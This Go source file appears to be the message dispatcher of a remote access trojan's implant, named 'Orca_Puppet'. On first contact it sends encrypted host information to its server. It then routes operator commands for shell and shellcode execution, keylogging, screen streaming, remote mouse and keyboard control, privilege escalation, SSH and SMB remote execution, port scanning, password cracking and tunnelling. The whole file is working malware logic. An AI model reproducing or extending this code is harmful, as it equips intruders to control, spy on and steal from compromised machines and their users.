package stager

import (
	"Orca_Puppet/cli/cmdopt/listopt"
	"Orca_Puppet/cli/common"
	"Orca_Puppet/cli/common/setchannel"
	"Orca_Puppet/define/config"
	"Orca_Puppet/tools/crypto"
	"time"
)

func SettleMsg(message string) {
	// 获取ClientId
	if common.ClientId == "" {
		common.ClientId = common.GetClientId(message)
		hostInfo := listopt.GetHostInfo()
		data, _ := crypto.Encrypt([]byte(hostInfo), []byte(config.AesKey))
		common.SendSuccessMsg("Server", common.ClientId, "hostInfo", data)
		common.Uptime = time.Now().Format("2006/01/02 15:04:05")
		return
	}
	msg, sendUserId, data := common.SettleRetDataBt(message)

	switch msg {
	case "closeClient":
		setchannel.CmdMsgChan <- message
		return
	case "execShell":
		setchannel.CmdMsgChan <- message
		return
	case "fileUpload":
		setchannel.CmdMsgChan <- message
		return
	case "fileDownload":
		setchannel.CmdMsgChan <- message
		return
	case "processList":
		setchannel.CmdMsgChan <- message
		return
	case "processKill":
		setchannel.CmdMsgChan <- message
		return
	case "info":
		setchannel.CmdMsgChan <- message
		return
	case "assemblyLoad":
		setchannel.CmdMsgChan <- message
		return
	case "assemblyList":
		setchannel.CmdMsgChan <- message
		return
	case "assemblyInvoke":
		setchannel.CmdMsgChan <- message
		return
	case "assemblyClear":
		setchannel.CmdMsgChan <- message
		return
	case "shellcode":
		setchannel.CmdMsgChan <- message
		return
	case "screenshot":
		setchannel.CmdMsgChan <- message
		return
	case "screenStream":
		setchannel.CmdMsgChan <- message
		return
	case "keylogger":
		setchannel.CmdMsgChan <- message
		return
	case "getScreenSize":
		setchannel.CmdMsgChan <- message
		return
	case "execPty":
		setchannel.CmdMsgChan <- message
		return
	case "getAdmin":
		setchannel.CmdMsgChan <- message
		return
	case "proxyClientStart":
		setchannel.CmdMsgChan <- message
		return
	case "proxyClientClose":
		setchannel.CmdMsgChan <- message
		return
	case "sshConnTest":
		setchannel.CmdMsgChan <- message
		return
	case "sshRun":
		setchannel.CmdMsgChan <- message
		return
	case "sshUpload":
		setchannel.CmdMsgChan <- message
		return
	case "sshDownload":
		setchannel.CmdMsgChan <- message
		return
	case "sshTunnelStart":
		setchannel.CmdMsgChan <- message
		return
	case "sshTunnelClose":
		setchannel.CmdMsgChan <- message
		return
	case "portScan":
		setchannel.CmdMsgChan <- message
		return
	case "portCrack":
		setchannel.CmdMsgChan <- message
		return
	case "smbUpload":
		setchannel.CmdMsgChan <- message
		return
	case "smbExec":
		setchannel.CmdMsgChan <- message
		return

	case "sliceData":
		m, exist := setchannel.GetFileSliceDataChan(sendUserId)
		if !exist {
			m = make(chan interface{})
			setchannel.AddFileSliceDataChan(sendUserId, m)
		}
		m <- data
		return
	case "assemblySliceData":
		m, exist := setchannel.GetFileSliceDataChan(sendUserId)
		if !exist {
			m = make(chan interface{})
			setchannel.AddFileSliceDataChan(sendUserId, m)
		}
		m <- data
		return
	case "shellcodeSliceData":
		m, exist := setchannel.GetFileSliceDataChan(sendUserId)
		if !exist {
			m = make(chan interface{})
			setchannel.AddFileSliceDataChan(sendUserId, m)
		}
		m <- data
		return
	case "nextScreen":
		m, exist := setchannel.GetNextScreenChan(sendUserId)
		if !exist {
			m = make(chan string)
			setchannel.AddNextScreenChan(sendUserId, m)
		}
		m <- "nextSign"
		return
	case "mouseAction":
		m, exist := setchannel.GetMouseActionChan(sendUserId)
		if !exist {
			m = make(chan string)
			setchannel.AddMouseActionChan(sendUserId, m)
		}
		m <- message
		return
	case "keyboardAction":
		m, exist := setchannel.GetKeyboardActionChan(sendUserId)
		if !exist {
			m = make(chan string)
			setchannel.AddKeyboardActionChan(sendUserId, m)
		}
		m <- message
		return
	case "ptyData":
		m, exist := setchannel.GetPtyDataChan(sendUserId)
		if !exist {
			m = make(chan interface{})
			setchannel.AddPtyDataChan(sendUserId, m)
		}
		m <- data
		return
	case "keyloggerQuit":
		m, exist := setchannel.GetKeyloggerQuitSignChan(sendUserId)
		if !exist {
			m = make(chan interface{})
			setchannel.AddKeyloggerQuitSignChan(sendUserId, m)
		}
		m <- "quit"
		return

	}
}
